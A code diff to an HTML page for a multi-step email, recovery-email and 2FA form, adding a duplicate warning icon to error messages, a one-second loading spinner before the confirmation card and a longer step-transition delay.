@@ -412,7 +412,7 @@
 </head>
 <body>
 
-  <!-- Toast Notification Popup with Exclamation Mark -->
+  <!-- Toast Notification Popup -->
   <div id="copy-toast">
     <div class="toast-icon-wrapper">
       <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
@@ -442,7 +442,8 @@
       </div>
       <div class="field-error-msg" id="email-error-msg">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-        <span id="email-error-text">Email already submitted</span>
+        <span>Email already submitted</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
       </div>
     </div>
     <div class="action-container">
@@ -503,6 +504,7 @@
       <div class="field-error-msg" id="recovery-error-msg">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
         <span>Email already submitted</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
       </div>
     </div>
     <div class="action-container">
@@ -698,7 +700,21 @@
       if (step === 3) formData.recovery = document.getElementById('input-recovery').value.trim();
       if (step === 4) {
         formData.twofa = document.getElementById('input-2fa').value.trim().toUpperCase();
-        buildConfirmationCard();
+        
+        const btnText = document.getElementById(`btn-text-${step}`);
+        const spinner = document.getElementById(`spinner-${step}`);
+        const btn = document.getElementById(`btn-${step}`);
+
+        btnText.style.display = 'none';
+        spinner.style.display = 'inline-block';
+        btn.disabled = true;
+
+        setTimeout(() => {
+          spinner.style.display = 'none';
+          btnText.style.display = 'inline';
+          btn.disabled = false;
+          buildConfirmationCard();
+        }, 1000);
         return;
       }
 
@@ -719,7 +735,7 @@
         currentStep = step + 1;
         document.getElementById(`step-${currentStep}`).classList.add('active');
         updateNavHeader();
-      }, 300);
+      }, 1000);
     }
 
     function goBackStep() {
